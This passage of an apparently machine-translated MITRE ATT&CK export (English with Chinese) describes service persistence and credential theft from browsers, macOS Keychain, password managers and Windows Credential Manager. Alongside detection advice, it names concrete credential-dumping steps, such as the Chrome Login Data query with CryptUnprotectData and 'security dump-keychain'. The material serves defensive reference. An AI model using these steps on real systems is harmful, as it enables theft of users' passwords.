功能通过创建和/或修改导致 systemd 在系统启动时执行恶意命令的服务单元文件来建立对受害系统的持久访问。（引文：Anomali Rocke 2019 年 3 月）虽然攻击者通常需要 root 权限才能创建/修改<code>/etc/systemd/system</code> 和 <code>/usr/lib/systemd/system</code> 目录下的服务单元文件，低权限用户可以在诸如<code>~/.config/systemd/user/</code> 实现用户级持久化。（引用：Rapid7 Service Persistence 22JUNE2016）
T1543.003,Create or Modify System Process: Windows Service,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.

Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. 

Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as ""Bring Your Own Vulnerable Driver"" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)

Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component).",https://attack.mitre.org/techniques/T1543/003,17 January 2020,30 June 2022,1.2,"Persistence, Privilege Escalation","Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  

Look for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  

Creation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.

Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",Windows,"Command: Command Execution, Driver: Driver Load, Process: OS API Execution, Process: Process Creation, Service: Service Creation, Service: Service Modification, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1543,,"Akshat Pradhan, Qualys; Matthew Demaske, Adaptforward; Mayuresh Dani, Qualys; Pedro Harrison; Wietze Beukema, @wietze",,,,"CAPEC-478, CAPEC-550, CAPEC-551",,"Administrator, SYSTEM","(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Kroll RawPOS Jan 2017),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: McAfee Bankshot),(Citation: Symantec Hydraq Persistence Jan 2010),(Citation: ESET Sednit Part 1),(Citation: TrendMicro PE_URSNIF.A2),(Citation: CISA AA20-301A Kimsuky),(Citation: FinFisher Citation),(Citation: ESET LoudMiner June 2019),(Citation: ClearSky Wilted Tulip July 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: GitHub PowerSploit May 2012),(Citation: Bitdefender StrongPity June 2020),(Citation: Talos Promethium June 2020),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Dell Sakula),(Citation: FireEye Operation Double Tap),(Citation: Novetta Blockbuster),(Citation: Symantec Hydraq Jan 2010),(Citation: FireEye APT10 April 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: ASERT InnaputRAT April 2018),(Citation: TrendMicro RawPOS April 2015),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Symantec Briba May 2012),(Citation: Kaspersky Carbanak),(Citation: US-CERT TYPEFRAME June 2018),(Citation: McAfee Cuba April 2021),(Citation: Trustwave GoldenSpy June 2020),(Citation: CIRCL PlugX March 2013),(Citation: Github PowerShell Empire),(Citation: Sophos Ragnar May 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: McAfee Night Dragon),(Citation: ESET PipeMon May 2020),(Citation: Symantec Volgmer Aug 2014),(Citation: ESET TeleBots Oct 2018),(Citation: Symantec Naid June 2012),(Citation: Unit 42 Shamoon3 2018),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: US-CERT Volgmer Nov 2017),(Citation: Unit 42 PingPull Jun 2022),(Citation: ESET Okrum July 2019),(Citation: Symantec Backdoor.Nidiran),(Citation: Unit 42 Kazuar May 2017),(Citation: ESET Carbon Mar 2017),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Palo Alto Reaver Nov 2017),(Citation: F-Secure CozyDuke),(Citation: PowerSploit Documentation),(Citation: NCC Group APT15 Alive and Strong),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Talent-Jump Clambling February 2020),(Citation: Dell Lateral Movement),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Symantec Catchamas April 2018),(Citation: Proofpoint ZeroT Feb 2017),(Citation: TrendMicro Lazarus Nov 2018),(Citation: FireEye FIN7 Aug 2018),(Citation: Dragos Crashoverride 2017),(Citation: Symantec Darkmoon Aug 2005),(Citation: US-CERT Emotet Jul 2018),(Citation: Symantec Dyre June 2015),(Citation: Malwarebytes Konni Aug 2021),(Citation: Secureworks Emotet Nov 2018),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Emissary Trojan Feb 2016),(Citation: Cylance Dust Storm),(Citation: ThreatStream Evasion Analysis),(Citation: Crowdstrike Indrik November 2018),(Citation: Group IB Cobalt Aug 2017),(Citation: Securelist Kimsuky Sept 2013),(Citation: F-Secure Cosmicduke),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Symantec Wiarp May 2012),(Citation: Group IB APT 41 June 2021),(Citation: Symantec W32.Duqu),(Citation: FireEye WannaCry 2017),(Citation: Lotus Blossom Jun 2015),(Citation: ESET InvisiMole June 2020),(Citation: Palo Alto MoonWind March 2017),(Citation: Palo Alto Networks BBSRAT),(Citation: CISA AppleJeus Feb 2021),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: ESET OceanLotus),(Citation: Talos ZxShell Oct 2014),(Citation: FireEye APT41 March 2020),(Citation: Cylance Shell Crew Feb 2017),(Citation: SANS Conficker),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: US-CERT Bankshot Dec 2017),(Citation: Symantec Orangeworm April 2018),(Citation: Check Point Sunburst Teardrop December 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Cylance Cleaver),(Citation: Palo Alto Shamoon Nov 2016),(Citation: CyberBit Dtrack),(Citation: ESET Gelsemium June 2021),(Citation: NCC Group WastedLocker June 2020),(Citation: Lastline PlugX Analysis),(Citation: Symantec Nerex May 2012),(Citation: PWC KeyBoys Feb 2017),(Citation: RedCanary Mockingbird May 2020),(Citation: Nccgroup Gh0st April 2018),(Citation: Microsoft Winnti Jan 2017),(Citation: Gh0stRAT ATT March 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye APT41 Aug 2019),(Citation: Russinovich Sysinternals),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit42 RDAT July 2020),(Citation: Bitdefender Naikon April 2021),(Citation: Mandiant APT1 Appendix),(Citation: Microsoft Wingbird Nov 2017),(Citation: Microsoft SIR Vol 21),(Citation: LogRhythm WannaCry),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: ESET Attor Oct 2019),(Citation: ESET GreyEnergy Oct 2018),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Microsoft FinFisher March 2018),(Citation: Microsoft driver block rules),(Citation: Malicious Driver Reporting Center)",创建或修改系统进程：Windows 服务,作为持久性的一部分，攻击者可能会创建或修改 Windows 服务以重复执行恶意负载。当 Windows 启动时，它会启动称为服务的程序或应用程序来执行后台系统功能。（引用：TechNet 服务）Windows 服务配置信息，包括服务的可执行文件或恢复程序/命令的文件路径，存储在 Windows 注册表中。攻击者可能会安装新服务或修改现有服务以在启动时执行，以便在系统上持续存在。可以使用系统实用程序（如 sc.exe）、直接修改注册表或直接与 Windows API 交互来设置或修改服务配置。攻击者也可能使用服务来安装和执行恶意驱动程序。例如，将驱动程序文件（例如：`.sys`）放入磁盘后，可以通过 [Native API](https://attack.mitre.org/techniques/T1106) 等函数加载和注册有效负载，例如` CreateServiceW()`（或通过诸如`ZwLoadDriver()`和`ZwSetValueKey()`等函数手动），通过创建所需的服务注册表值（即[修改注册表]（https://attack.mitre.org/techniques/ T1112))，或使用命令行实用程序，例如“PnPUtil.exe”。（引用：Symantec W.32 Stuxnet Dossier）（引用：Crowdstrike DriveSlayer 2022 年 2 月）（引用：Unit42 AcidBox 2020 年 6 月）攻击者可能会利用这些驱动程序作为 [Rootkit](https://attack.mitre.org/techniques/T1014) 隐藏系统上存在的恶意活动。攻击者还可以将已签名但易受攻击的驱动程序加载到受感染的机器上（称为“自带易受攻击的驱动程序”（BYOVD）），作为 [利用特权升级] (https://attack.mitre.org/techniques/T1068) 的一部分).（引用：ESET InvisiMole 2020 年 6 月）（引用：Unit42 AcidBox 2020 年 6 月）可以使用管理员权限创建服务，但在 SYSTEM 权限下执行，因此攻击者也可以使用服务来提升权限。攻击者也可以通过[Service Execution]（https://attack.mitre.org/techniques/T1569/002）直接启动服务。为了使检测分析更具挑战性，恶意服务还可能包含[伪装任务或服务]（https://attack.mitre.org/techniques/T1036/004）（例如：使用与合法相关的服务和/或有效负载名称操作系统或良性软件组件）。
T1555,Credentials from Password Stores,"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",https://attack.mitre.org/techniques/T1555,11 February 2020,01 April 2022,1.0,Credential Access,"Monitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Access, Process: Process Creation",False,,,,Administrator,,,,,,"(Citation: Deply Mimikatz),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: SecureWorks August 2019),(Citation: CopyKittens Nov 2015),(Citation: Symantec Elfin Mar 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: GitHub Pupy),(Citation: Unit 42 Playbook Dec 2017),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Infoblox Lokibot January 2019),(Citation: GitHub QuasarRAT),(Citation: BitDefender Chafer May 2020),(Citation: ClearSky Wilted Tulip July 2017),(Citation: FireEye APT28),(Citation: Cybereason Kimsuky November 2020),(Citation: ESET Operation Groundbait),(Citation: Cybereason Astaroth Feb 2019),(Citation: ESET PLEAD Malware July 2018),(Citation: FireEye APT35 2018),(Citation: Volexity Patchwork June 2018),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: FireEye APT33 Guardrail),(Citation: GitHub LaZagne Dec 2018),(Citation: Trend Micro Muddy Water March 2021),(Citation: ESET EvilNum July 2020),(Citation: Visa FIN6 Feb 2019),(Citation: Prevx Carberp March 2011),(Citation: Red Canary NETWIRE January 2020),(Citation: Symantec Leafminer July 2018),(Citation: FireEye APT34 July 2019),(Citation: GitHub Mimikatz lsadump Module),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: F-Secure The Dukes),(Citation: NCSC Joint Report Public Tools),(Citation: Symantec MuddyWater Dec 2018),",来自密码存储的凭据/从密码库中获取凭证,攻击者可能会搜索常见的密码存储位置以获取用户凭据。密码存储在系统上的多个位置，具体取决于持有凭据的操作系统或应用程序。还有一些特定的应用程序可以存储密码，以方便用户管理和维护。获得凭据后，它们可用于执行横向移动和访问受限信息。
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.

For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)
 
Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).

Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)

After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",https://attack.mitre.org/techniques/T1555/003,12 February 2020,15 February 2022,1.1,Credential Access,"Identify web browser files that contain credentials such as Google Chrome’s Login Data database file: <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).","Linux, Windows, macOS","Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Access",True,T1555,,"Barry Shteiman, Exabeam; RedHuntLabs, @redhuntlabs; Ryan Benson, Exabeam; Sylvain Gil, Exabeam",User,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Talos Smoke Loader July 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Fidelis njRAT June 2013),(Citation: Symantec Inception Framework March 2018),(Citation: IBM Grandoreiro April 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: CISA AA20-301A Kimsuky),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Operation Groundbait),(Citation: ESET Zebrocy May 2019),(Citation: Talos Olympic Destroyer 2018),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Volexity Patchwork June 2018),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye APT33 Guardrail),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: FireEye APT34 July 2019),(Citation: GitHub Mimikatz lsadump Module),(Citation: Forcepoint Monsoon),(Citation: NCSC Joint Report Public Tools),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Symantec MuddyWater Dec 2018),(Citation: Secureworks Karagany July 2019),(Citation: Github PowerShell Empire),(Citation: Symantec Dragonfly),(Citation: IBM IcedID November 2017),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Unit 42 Playbook Dec 2017),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: GitHub QuasarRAT),(Citation: FireEye APT28),(Citation: Cybereason Kimsuky November 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: JPCert TSCookie March 2018),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: Cymmetria Patchwork),(Citation: GitHub LaZagne Dec 2018),(Citation: BiZone Lizar May 2021),(Citation: Prevx Carberp March 2011),(Citation: Talos Konni May 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Cisco H1N1 Part 2),(Citation: Red Canary NETWIRE January 2020),(Citation: FireEye APT37 Feb 2018),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Symantec Elfin Mar 2019),(Citation: Talos Group123),(Citation: Check Point Warzone Feb 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Unit42 Azorult Nov 2018),(Citation: GitHub Pupy),(Citation: Proofpoint NETWIRE December 2020),(Citation: Infoblox Lokibot January 2019),(Citation: Symantec Buckeye),(Citation: FireEye NETWIRE March 2019),(Citation: Trend Micro njRAT 2018),(Citation: Proofpoint TA505 Sep 2017),(Citation: FireEye APT35 2018),(Citation: Trend Micro Emotet Jan 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET Telebots Dec 2016),(Citation: Visa FIN6 Feb 2019),(Citation: Symantec Leafminer July 2018),(Citation: F-Secure The Dukes),(Citation: ESET PLEAD Malware July 2018),(Citation: Talos PoetRAT April 2020),(Citation: Deply Mimikatz),(Citation: DustySky),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Check Point Rocket Kitten),(Citation: ESET Machete July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: objsee mac malware 2017),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: XAgentOSX 2017),(Citation: Accenture Hogfish April 2018),(Citation: F-Secure BlackEnergy 2014),(Citation: Zdnet Kimsuky Dec 2018),(Citation: Trend Micro Muddy Water March 2021),(Citation: Bitdefender Naikon April 2021),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Citizen Lab Group5),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Bitdefender Agent Tesla April 2020),",来自密码存储的凭据/从密码库中获取凭证：来自 Web 浏览器的凭据,攻击者可以通过读取特定于目标浏览器的文件从 Web 浏览器获取凭据。（引用：Talos Olympic Destroyer 2018）Web 浏览器通常会保存网站用户名和密码等凭据，以便将来无需手动输入。 Web 浏览器通常将凭据以加密格式存储在凭据存储中。但是，存在从 Web 浏览器中提取明文凭据的方法。例如，在 Windows 系统上，可以通过读取数据库文件 <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> 并执行 SQL 查询从 Google Chrome 获取加密凭据：< code>SELECT action_url、username_value、password_value FROM logins;</code>.然后可以通过将加密凭据传递给 Windows API 函数 <code>CryptUnprotectData</code> 来获取明文密码，该函数使用受害者缓存的登录凭据作为解密密钥。（引用：Microsoft CryptUnprotectData April 2018）攻击者执行了类似的操作常见 Web 浏览器（例如 FireFox、Safari、Edge 等）的程序（引文：Proofpoint Vega Credential Stealer 2018 年 5 月）（引文：FireEye HawkEye Malware 2017 年 7 月）Windows 将 Internet Explorer 和 Microsoft Edge 凭据存储在由 [Windows凭证管理器](https://attack.mitre.org/techniques/T1555/004)。攻击者还可以通过在 Web 浏览器进程内存中搜索通常匹配凭据的模式来获取凭据。（引用：GitHub Mimikittenz 2016 年 7 月）从 Web 浏览器获取凭据后，攻击者可能会尝试在不同系统和/或帐户之间回收凭据，以便扩大访问。在从 Web 浏览器获得的凭据与特权帐户（例如域管理员）重叠的情况下，这可能会显着促进对手的目标。
T1555.001,Credentials from Password Stores: Keychain,"Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. 

Keychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)

Adversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  ",https://attack.mitre.org/techniques/T1555/001,12 February 2020,18 April 2022,1.1,Credential Access,"Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.",macOS,"Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Creation",True,T1555,,,,,,,,,"(Citation: objsee mac malware 2017),(Citation: Symantec Calisto July 2018),(Citation: Securelist Calisto July 2018),(Citation: GitHub LaZagne Dec 2018),(Citation: ESET DazzleSpy Jan 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),",来自密码存储的凭据/从密码库中获取凭证：钥匙串,攻击者可能会从 Keychain 获取凭证。钥匙串（或钥匙串服务）是 macOS 凭证管理系统，用于存储帐户名、密码、私钥、证书、敏感应用程序数据、支付数据和安全笔记。钥匙串分为三种类型：登录钥匙串、系统钥匙串和本地项目 (iCloud) 钥匙串。默认的钥匙串是登录钥匙串，它存储用户密码和信息。 System Keychain 存储操作系统访问的项目，例如主机上用户之间共享的项目。本地项目 (iCloud) 钥匙串用于与 Apple 的 iCloud 服务同步的项目。可以通过 Keychain Access 应用程序或使用命令行实用程序 <code>security</code> 查看和编辑钥匙串。钥匙串文件位于 <code>~/Library/Keychains/</code>、<code>/Library/Keychains/</code> 和 <code>/Network/Library/Keychains/</code> 中。（引用: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann) 攻击者可能会从 Keychain 存储/内存中收集用户凭据。例如，命令 <code>security dump-keychain –d</code> 将从 <code>~/Library/Keychains/login.keychain-db</code> 转储所有登录钥匙串凭据。攻击者也可以直接从 <code>~/Library/Keychains/login.keychain</code> 文件中读取登录钥匙串凭据。两种方法都需要密码，其中登录钥匙串的默认密码是当前用户登录 macOS 主机的密码。（引用：外部到 DA，OS X 方式）（引用：Empire Keychain Decrypt）
T1555.005,Credentials from Password Stores: Password Managers,"Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)

Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)
 Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)",https://attack.mitre.org/techniques/T1555/005,22 January 2021,25 March 2022,1.0,Credential Access,"Consider monitoring API calls, file read events, and processes for suspicious activity that could indicate searching in process memory of password managers. 

Consider monitoring file reads surrounding known password manager applications.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Access",True,T1555,,"Matt Burrough, @mattburrough, Microsoft",User,,,,,,"(Citation: objsee mac malware 2017),(Citation: Trend Micro DRBControl February 2020),(Citation: Cyberreason Anchor December 2019),(Citation: FoxIT Wocao December 2019),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: NIST 800-63-3)",来自密码存储的凭据/从密码库中获取凭证：密码管理器,攻击者可能会从第三方密码管理器获取用户凭据。（引文：ise Password Manager 2019 年 2 月）密码管理器是旨在存储用户凭据的应用程序，通常在加密数据库中。在用户提供解锁数据库的主密码后，通常可以访问凭据。数据库解锁后，这些凭证可能会复制到内存中。这些数据库可以作为文件存储在磁盘上。（引用：ise Password Manager 2019 年 2 月）攻击者可以通过从内存中提取主密码和/或纯文本凭据来从密码管理器获取用户凭据。（引用：FoxIT Wocao 2019 年 12 月） （引用：Github KeeThief）攻击者可以通过 [Exploitation for Credential Access]（https://attack.mitre.org/techniques/T1212）从内存中提取凭据。（引用：NVD CVE-2019-3610）攻击者也可以尝试暴力破解通过[密码猜测]（https://attack.mitre.org/techniques/T1110/001）强制获取密码管理器的主密码。（引用：Cyberreason Anchor December 2019）
T1555.002,Credentials from Password Stores: Securityd Memory,"An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)

In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",https://attack.mitre.org/techniques/T1555/002,12 February 2020,08 March 2022,1.1,Credential Access,Monitor processes and command-line arguments for activity surrounded users searching for credentials or using automated tools to scan memory for passwords.,"Linux, macOS","Command: Command Execution, Process: Process Access",True,T1555,,,root,,,,,,"(Citation: synack 2016 review),",来自密码存储的凭据/从密码库中获取凭证：安全内存,攻击者可能会获得 root 访问权限（允许他们读取 securityd 的内存），然后他们可以通过内存扫描以在相对较少的尝试中找到正确的密钥序列来解密用户的登录钥匙串。这为攻击者提供了用户、WiFi、邮件、浏览器、证书、安全笔记等的所有明文密码。（引用：OS X Keychain）（引用：OSX Keydnap 恶意软件）在 El Capitan 之前的 OS X 中，具有 root 权限的用户access 可以读取已登录用户的明文钥匙串密码，因为 Apple 的钥匙串实现允许缓存这些凭据，这样就不会重复提示用户输入密码。（引用：OS X 钥匙串）（引用：DA 外部，OS X 方式） Apple 的安全实用程序获取用户的登录密码，使用 PBKDF2 对其进行加密，并将此主密钥存储在内存中。 Apple 还使用一组密钥和算法来加密用户的密码，但一旦找到主密钥，攻击者只需遍历其他值即可解锁最终密码。（引用：OS X 钥匙串）
T1555.004,Credentials from Password Stores: Windows Credential Manager,"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)

The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.

Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)

Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)

